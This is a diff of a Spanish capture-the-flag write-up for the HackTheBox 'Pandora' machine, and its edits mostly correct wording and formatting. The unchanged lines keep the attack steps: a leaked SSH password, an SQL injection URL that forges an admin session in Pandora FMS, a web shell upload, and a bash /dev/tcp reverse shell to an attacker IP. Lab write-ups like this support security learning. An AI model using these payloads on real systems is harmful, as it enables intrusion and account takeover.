@@ -135,7 +135,7 @@ Modifiquemos nuestro archivo **`/etc/hosts`** para añadir el virtualhost **`pan
 p3ntest1ng:~$ echo '10.10.11.136 panda.htb' | sudo tee -a /etc/hosts
 ```
 
-Veamos con qué encontramos con **`wfuzz`**, primero probamos un diccionario pequeño y si no encuentramos nada, usamos uno más grande.
+Veamos qué encontramos con **`wfuzz`**, primero probamos un diccionario pequeño y si no encontramos nada, usamos uno más grande.
 
 | Parámetro | Descripción |
 | --------- | :---------- |
@@ -488,7 +488,7 @@ exec /usr/sbin/apachectl -D FOREGROUND
 ```
 
 Vemos que se están realizando varias operatorias sobre los archivos **`config.php`**, **`php.ini`** y algunos directorios.
-Este script nos da indicios de que existe una consola para un panel llamado Pandora el cual dispone de una consola.
+Este script nos da indicios de que existe una consola para un panel llamado Pandora.
 Dado que no tenemos acceso desde el exterior, vamos a levantar un túnel hacia este recurso con ayuda de **`SSH`**:
 
 ```console
@@ -503,24 +503,26 @@ daniel@panda.htb's password: HotelBabylon23
 daniel@pandora:~$ 
 ```
 
-Con esto, ahora deberíamos ser capaces de ver el panel que antes no podíamos ver ya que estaba compartido de forma local:
+Con esto, ahora deberíamos ser capaces de ver el panel que antes no podíamos ver ya que sólo estaba disponible de forma local:
 
 ![Pandora](/assets/images/hackthebox/machines/pandora/console.png)
 
-Abajo del todo vemos la versión del CMS: **`v7.0NG.742_FIX_PERL2020`** y realizando una búsqueda en Google, encontramos que es vulnerable a **`SQL Injection`**.
+Abajo del todo vemos la versión del CMS: **`v7.0NG.742_FIX_PERL2020`** y realizando una búsqueda en Google, encontramos que es vulnerable a **`SQL Injection`**
 
 ![CVE1](/assets/images/hackthebox/machines/pandora/cve1.png)
 
-[https://github.com/TheCyberGeek/CVE-2020-5844](https://github.com/TheCyberGeek/CVE-2020-5844)
+> [https://github.com/TheCyberGeek/CVE-2020-5844](https://github.com/TheCyberGeek/CVE-2020-5844)
 
-Antes de ejecutar el exploit, podemos verificar el SQLI, en Google se encuentran diversos artículos explicando las vulnerabilidades de este CMS,
+En Google se encuentran diversos artículos explicando las vulnerabilidades de este CMS,
 nosotros vamos a centrarnos en aplicar un **`Unauthenticated SQL Injection`** (CVE-2021-32099).
+
+Pero primero vamos a verificar el SQL Injection:
 
 ![UnAuth SQLI](/assets/images/hackthebox/machines/pandora/unauth_sqli.png)
 
 ![SQLI Success](/assets/images/hackthebox/machines/pandora/sqli.png)
 
-Primero analicemos este exploit: [https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)
+Analicemos el siguiente exploit: [https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)
 
 En el código vemos cómo se hace la consulta para obtener la cookie de sesión del usuario administrador:
 
@@ -530,12 +532,16 @@ Ejecutando esta consulta sobre el servidor web (en este caso sobre nuestro local
 
 ![Get Cookie](/assets/images/hackthebox/machines/pandora/get_cookie.png)
 
+```
 http://localhost/pandora_console/include/chart_generator.php?session_id=%27%20union%20SELECT%201,2,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20--%20SgGO
+```
 
-Teniendo la cookie del admin, podemos inyectarla en una petición usando el parámetro **`session_id`**:
+Teniendo la cookie del admin, podemos inyectarla en una petición usando el parámetro **`session_id`**
+```
 http://localhost/pandora_console/include/chart_generator.php?session_id=nvccpkpgo3sq1i9g333v3vp6it
+```
 
-Si recargamos la página, deberíamos haber logrado acceso como administrador al panel:
+Si recargamos la página con F5, deberíamos haber logrado acceso como administrador al panel:
 
 ![Admin](/assets/images/hackthebox/machines/pandora/admin.png)
 
@@ -556,7 +562,7 @@ Pues sabiendo todo esto, vamos a subir nuestra web shell en PHP para poder ejecu
 
 ![Uploading](/assets/images/hackthebox/machines/pandora/uploading.png)
 
-![Success](/assets/images/hackthebox/machines/pandora/succcess.png)
+![Success](/assets/images/hackthebox/machines/pandora/success.png)
 
 ![Uploaded](/assets/images/hackthebox/machines/pandora/uploaded.png)
 
@@ -564,7 +570,7 @@ Ahora simplemente vamos a la dirección donde se encuentra nuestro archivo php y
 
 ![RCE](/assets/images/hackthebox/machines/pandora/rce.png)
 
-Vamos a entablar conexión inversa hacia nuestra máquina para mayor comodidad operando con una shell:
+Vamos a entablar una conexión inversa hacia nuestra máquina para mayor comodidad y operar con una shell:
 
 ```bash
 bash -c "bash -i >& /dev/tcp/10.10.16.40/9999 0>&1"
@@ -585,7 +591,6 @@ Es conveniente realizar un tratamiento a esta shell para tener una tty completa:
 
 ```console
 matt@pandora:/var/www/pandora/pandora_console/images$ script /dev/null -c bash
-<ra/pandora_console/images$ script /dev/null -c bash  
 Script started, file is /dev/null
 matt@pandora:/var/www/pandora/pandora_console/images$ ^Z
 zsh: suspended  nc -nlvp 9999
